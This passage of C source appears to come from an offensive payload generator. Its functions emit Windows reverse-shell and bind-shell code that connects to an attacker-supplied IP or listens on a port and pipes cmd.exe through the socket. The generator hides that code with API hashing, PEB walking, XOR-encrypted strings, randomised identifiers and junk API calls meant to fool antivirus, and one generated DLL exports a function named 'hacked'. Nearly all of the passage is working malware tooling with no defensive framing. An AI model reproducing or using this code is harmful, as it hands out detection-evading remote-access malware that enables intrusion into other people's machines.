        "    p%s(socket);\n"
        "    p%s();\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE hK3 = %s(%s);\n"
        "    HMODULE tdl = %s(%s);\n"
        "    %s p%s = (%s)%s(hK3, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), xey, sizeof(xey));\n"
        "    HMODULE hws = p%s(ws2);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hK3, %s);\n"
        "    p%s = (%s)%s(tdl, %s);\n"
        "    p%s = (%s)%s(tdl, %s);\n"
        "    p%s = (%s)%s(tdl, %s);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        //"    %s(0.5);\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    %s();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE , DWORD ul_reason_for_call, LPVOID ) {\n"
        "    switch (ul_reason_for_call) {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        random_toUpper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        inet_pton_hash_name,
        htons_hash_name,
        connect_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        ntwait_hash_name,
        ntdelay_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        inet_pton_typedef,
        htons_typedef,
        connect_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        NtWait_typedef,
        NtDelay_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_ip, obf_cmd, obf_ws2dll,
        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        inet_pton_typedef, pinet_pton_name,
        htons_typedef, phtons_name,
        connect_typedef, pconnect_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        NtWait_typedef, pNtWait_name,
        NtDelay_typedef, pNtDelay_name,
        NtClose_typedef, pNtClose_name,
        LoadLibraryA_typedef, pLoadLib_name,
        random_zero_func,
        random_delay_func,
        pNtDelay_name,
        random_connect_func,
        random_obf_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        pinet_pton_name,
        pconnect_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_zero_func,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        pinet_pton_name, inet_pton_typedef, random_getproc_name, inet_pton_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pconnect_name, connect_typedef, random_getproc_name, connect_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtDelay_name, NtDelay_typedef, random_getproc_name, ntdelay_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_func_name,
        random_init_func,
        //random_delay_func,
        random_connect_func,
        random_func_name
    );
}
void obf_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10], random_delay_func[10];
    char random_connect_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_connect_func, sizeof(random_connect_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH and GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], pinet_pton_name[9];
    char phtons_name[9], pconnect_name[9], pclosesocket_name[9];
    char pWSACleanup_name[9], pCreateProcessA_name[9], pNtWait_name[9];
    char pNtDelay_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(pinet_pton_name, sizeof(pinet_pton_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pconnect_name, sizeof(pconnect_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtDelay_name, sizeof(pNtDelay_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], inet_pton_hash_name[12];
    char htons_hash_name[10], connect_hash_name[11], closesocket_hash_name[11];
    char wsacleanup_hash_name[13], createprocessa_hash_name[15], ntwait_hash_name[14];
    char ntdelay_hash_name[8], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(inet_pton_hash_name, sizeof(inet_pton_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(connect_hash_name, sizeof(connect_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntdelay_hash_name, sizeof(ntdelay_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], inet_pton_typedef[12];
    char htons_typedef[12], connect_typedef[12], closesocket_typedef[12];
    char WSACleanup_typedef[12], CreateProcessA_typedef[12], NtWait_typedef[12];
    char NtDelay_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(inet_pton_typedef, sizeof(inet_pton_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(connect_typedef, sizeof(connect_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtDelay_typedef, sizeof(NtDelay_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID %s() {\n"
        "    PVOID pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s 0xA5E086A2\n"
        "#define %s 0x5251037A\n"
        "#define %s 0xA4E3F108\n"
        "#define %s 0x5925BC50\n"
        "#define %s 0xE2F31987\n"
        "#define %s 0xB9D29D42\n"
        "#define %s 0xBC98541E\n"
        "#define %s 0x068FB8DC\n"
        "#define %s 0x65188A91\n"
        "#define %s 0xE6AD20A5\n"
        "#define %s 0x4CA64FE6\n"
        "#define %s 0xCB42C5A9\n"
        "#define %s 0x1236E2D7\n"
        "#define %s 0xF20D7F2A\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* %s)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xey[] = \"%s\";\n"
        "char ph[] = {%s};\n"
        "char hm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "VOID %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s((char*)hm, sizeof(hm), xey, sizeof(xey));\n"
        "    %s((char*)ph, sizeof(ph), xey, sizeof(xey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    p%s(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        p%s();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = p%s(%d);\n"
        "    p%s(AF_INET, ph, &remot_addr.sin_addr);\n"
        "    if (p%s(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        p%s(socket);\n"
        "        p%s();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    %s(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"
        "    if (p%s(NULL, hm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        p%s(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    p%s(pi.hProcess);\n"
        "    p%s(pi.hThread);\n"
        "    p%s(socket);\n"
        "    p%s();\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE K32 = %s(%s);\n"
        "    HMODULE l32 = %s(%s);\n"
        "    %s p%s = (%s)%s(K32, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), xey, sizeof(xey));\n"
        "    HMODULE h32 = p%s(ws2);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(K32, %s);\n"
        "    p%s = (%s)%s(l32, %s);\n"
        "    p%s = (%s)%s(l32, %s);\n"
        "    p%s = (%s)%s(l32, %s);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE ,HINSTANCE ,LPSTR ,int) {\n"
        "    %s();\n"
        //"    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_func_name,
        random_helper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        inet_pton_hash_name,
        htons_hash_name,
        connect_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        ntwait_hash_name,
        ntdelay_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        inet_pton_typedef,
        htons_typedef,
        connect_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        NtWait_typedef,
        NtDelay_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_ip, obf_cmd, obf_ws2dll,


        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        inet_pton_typedef, pinet_pton_name,
        htons_typedef, phtons_name,
        connect_typedef, pconnect_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        NtWait_typedef, pNtWait_name,
        NtDelay_typedef, pNtDelay_name,
        NtClose_typedef, pNtClose_name,
        LoadLibraryA_typedef, pLoadLib_name,

        random_zero_func,

        random_delay_func,
        pNtDelay_name,

        random_connect_func,
        random_obf_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        pinet_pton_name,
        pconnect_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_zero_func,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        pinet_pton_name, inet_pton_typedef, random_getproc_name, inet_pton_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pconnect_name, connect_typedef, random_getproc_name, connect_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtDelay_name, NtDelay_typedef, random_getproc_name, ntdelay_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_init_func,
        //random_delay_func,
        random_connect_func
    );
}
void obf_3_bind_tcp(char* payload, size_t size, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10];
    char random_bind_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_bind_func, sizeof(random_bind_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH, GetProcAddressH, and IatCamouflage
    char random_getmodule_name[15], random_getproc_name[15], random_iatcamouflage_name[8];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], phtons_name[9];
    char pclosesocket_name[9], pWSACleanup_name[9], pCreateProcessA_name[9];
    char pbind_name[9], plisten_name[9], paccept_name[9];
    char pNtWait_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pbind_name, sizeof(pbind_name));
    generate_random_string(plisten_name, sizeof(plisten_name));
    generate_random_string(paccept_name, sizeof(paccept_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], htons_hash_name[10];
    char closesocket_hash_name[11], wsacleanup_hash_name[13], createprocessa_hash_name[15];
    char bind_hash_name[10], listen_hash_name[10], accept_hash_name[10];
    char ntwait_hash_name[14], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(bind_hash_name, sizeof(bind_hash_name));
    generate_random_string(listen_hash_name, sizeof(listen_hash_name));
    generate_random_string(accept_hash_name, sizeof(accept_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], htons_typedef[12];
    char closesocket_typedef[12], WSACleanup_typedef[12], CreateProcessA_typedef[12];
    char bind_typedef[12], listen_typedef[12], accept_typedef[12];
    char NtWait_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(bind_typedef, sizeof(bind_typedef));
    generate_random_string(listen_typedef, sizeof(listen_typedef));
    generate_random_string(accept_typedef, sizeof(accept_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "extern void* __cdecl memset(void*, int, size_t);\n"
        "#pragma intrinsic(memset)\n"
        "#pragma function(memset)\n\n"
        "void* __cdecl memset(void* Destination, int Value, size_t Size) {\n"
        "    unsigned char* p = (unsigned char*)Destination;\n"
        "    while (Size > 0) {\n"
        "        *p = (unsigned char)Value;\n"
        "        p++;\n"
        "        Size--;\n"
        "    }\n"
        "    return Destination;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
